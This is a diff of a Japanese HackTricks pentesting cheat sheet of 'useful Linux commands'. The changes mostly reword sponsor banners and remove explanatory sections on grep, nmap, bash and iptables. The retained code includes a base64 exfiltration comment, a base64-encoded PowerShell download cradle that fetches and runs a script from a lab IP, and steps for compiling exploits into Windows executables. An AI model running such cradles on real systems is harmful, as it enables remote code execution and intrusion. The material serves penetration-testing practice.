@@ -1,25 +1,28 @@
 # 便利なLinuxコマンド
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。
-今すぐアクセスを取得：
+\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化**します。\
+今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+HackTricksをサポートする他の方法：
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-## 一般的なBashコマンド
+## 一般的なBash
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -138,15 +141,15 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
-今すぐアクセスを取得してください：
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) を使用して、世界で**最も高度な**コミュニティツールを動力とする**ワークフローを簡単に構築し自動化**します。\
+今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Windows用のBash
+## Windows用Bash
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -166,30 +169,7 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
-## グレップ
-
-`grep`コマンドは、テキストファイル内で特定のパターンを検索するために使用されます。以下は、`grep`コマンドの一般的な使用法です。
-
-```bash
-grep pattern file
-```
-
-- `pattern`は検索する文字列または正規表現パターンです。
-- `file`は検索対象のファイルです。
-
-`grep`コマンドは、指定したファイル内でパターンに一致する行を表示します。デフォルトでは、大文字と小文字は区別されますが、`-i`オプションを使用すると大文字と小文字を区別しないようにすることもできます。
-
-```bash
-grep -i pattern file
-```
-
-`grep`コマンドは、複数のファイルを一度に検索することもできます。
-
-```bash
-grep pattern file1 file2 file3
-```
-
-`grep`コマンドは非常に強力であり、テキストファイル内での特定の情報の検索に役立ちます。
+## Greps
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -269,75 +249,7 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Nmap検索のヘルプ
-
-Nmap is a powerful network scanning tool used to discover hosts and services on a computer network. It provides a wide range of options and features to customize and optimize the scanning process. Here are some useful Nmap commands and their descriptions:
-
-Nmapは、コンピューターネットワーク上のホストやサービスを発見するために使用される強力なネットワークスキャンツールです。スキャンプロセスをカスタマイズして最適化するためのさまざまなオプションと機能を提供します。以下に、いくつかの便利なNmapコマンドとその説明を示します。
-
-### Basic Scanning
-
-基本的なスキャン
-
-- `nmap target`: Performs a basic scan on the specified target.
-
-  `nmap ターゲット`: 指定したターゲットに対して基本的なスキャンを実行します。
-
-- `nmap -F target`: Performs a fast scan on the specified target, scanning only the most common ports.
-
-  `nmap -F ターゲット`: 指定したターゲットに対して高速スキャンを実行し、最も一般的なポートのみをスキャンします。
-
-### Port Scanning
-
-ポートスキャン
-
-- `nmap -p port target`: Scans the specified port on the target.
-
-  `nmap -p ポート ターゲット`: ターゲット上の指定したポートをスキャンします。
-
-- `nmap -p- target`: Scans all ports on the target.
-
-  `nmap -p- ターゲット`: ターゲット上のすべてのポートをスキャンします。
-
-### Service and Version Detection
-
-サービスとバージョンの検出
-
-- `nmap -sV target`: Performs service and version detection on the target.
-
-  `nmap -sV ターゲット`: ターゲット上でサービスとバージョンの検出を実行します。
-
-### OS Detection
-
-OS検出
-
-- `nmap -O target`: Performs OS detection on the target.
-
-  `nmap -O ターゲット`: ターゲット上でOSの検出を実行します。
-
-### Script Scanning
-
-スクリプトスキャン
-
-- `nmap --script script target`: Executes the specified script against the target.
-
-  `nmap --script スクリプト ターゲット`: 指定したスクリプトをターゲットに対して実行します。
-
-### Output Options
-
-出力オプション
-
-- `nmap -oN output.txt target`: Saves the scan results in normal format to the specified file.
-
-  `nmap -oN 出力.txt ターゲット`: スキャン結果を指定したファイルに通常の形式で保存します。
-
-- `nmap -oX output.xml target`: Saves the scan results in XML format to the specified file.
-
-  `nmap -oX 出力.xml ターゲット`: スキャン結果を指定したファイルにXML形式で保存します。
-
-These are just a few examples of the many options and features available in Nmap. For more information, refer to the [Nmap documentation](https://nmap.org/docs.html).
-
-これらは、Nmapで利用可能な多くのオプションと機能の一部です。詳細については、[Nmapのドキュメント](https://nmap.org/docs.html)を参照してください。
+## Nmap 検索ヘルプ
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
@@ -345,95 +257,11 @@ locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | gre
 nmap --script-help "(default or version) and smb)"
 ```
 ## Bash
-
-Bash（Bourne Again SHell）は、LinuxおよびUNIXシステムで広く使用されているデフォルトのシェルです。Bashは、コマンドラインでの作業を容易にするために使用されます。以下に、Bashで使用できるいくつかの便利なコマンドを示します。
-
-### ファイルとディレクトリの操作
-
-- `ls`：現在のディレクトリ内のファイルとディレクトリを表示します。
-- `cd`：ディレクトリを変更します。
-- `pwd`：現在のディレクトリのパスを表示します。
-- `mkdir`：新しいディレクトリを作成します。
-- `rm`：ファイルまたはディレクトリを削除します。
-- `cp`：ファイルまたはディレクトリをコピーします。
-- `mv`：ファイルまたはディレクトリを移動または名前を変更します。
-
-### ファイルの編集
-
-- `cat`：ファイルの内容を表示します。
-- `less`：ファイルの内容をページ単位で表示します。
-- `head`：ファイルの先頭から指定された行数を表示します。
-- `tail`：ファイルの末尾から指定された行数を表示します。
-- `grep`：指定されたパターンに一致する行を検索します。
-
-### プロセスの管理
-
-- `ps`：実行中のプロセスを表示します。
-- `top`：システムのリソース使用状況と実行中のプロセスを表示します。
-- `kill`：プロセスを終了します。
-
-これらは、Bashで使用できる便利なコマンドの一部です。これらのコマンドを使いこなすことで、Linuxシステムでの作業がより効率的になります。
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
 ## Iptables
-
-Iptables is a powerful firewall utility for Linux systems. It allows you to configure and manage network traffic by creating rules and chains. With iptables, you can control incoming and outgoing traffic, filter packets based on various criteria, and set up network address translation (NAT).
-
-### Basic Usage
-
-To view the current iptables rules, use the following command:
-
-```bash
-iptables -L
-```
-
-To add a new rule, use the `iptables -A` command followed by the desired options. For example, to allow incoming SSH connections, you can use the following command:
-
-```bash
-iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-```
-
-To delete a rule, use the `iptables -D` command followed by the rule number. For example, to delete the rule at position 3 in the INPUT chain, you can use the following command:
-
-```bash
-iptables -D INPUT 3
-```
-
-### Common Options
-
-Here are some common options that you can use with iptables:
-
-- `-A` (append): Adds a new rule to the end of a chain.
-- `-D` (delete): Deletes a rule from a chain.
-- `-I` (insert): Inserts a new rule at a specific position in a chain.
-- `-L` (list): Lists all the rules in a chain.
-- `-F` (flush): Deletes all the rules in a chain.
-- `-P` (policy): Sets the default policy for a chain.
-- `-s` (source): Specifies the source IP address or network.
-- `-d` (destination): Specifies the destination IP address or network.
-- `-p` (protocol): Specifies the protocol (e.g., tcp, udp).
-- `--dport` (destination port): Specifies the destination port number.
-- `-j` (jump): Specifies the target action for a rule.
-
-### Saving and Restoring Rules
-
-To save your iptables rules, you can use the `iptables-save` command. This will output the current rules in a format that can be easily restored later.
-
-```bash
-iptables-save > rules.txt
-```
-
-To restore the saved rules, you can use the `iptables-restore` command.
-
-```bash
-iptables-restore < rules.txt
-```
-
-### Conclusion
-
-Iptables is a versatile tool for managing network traffic on Linux systems. By understanding its basic usage and common options, you can effectively configure and secure your system's firewall.
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -466,20 +294,22 @@ iptables -P OUTPUT ACCEPT
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築**および**自動化**します。\
-今すぐアクセスを取得：
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化する**。\
+今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
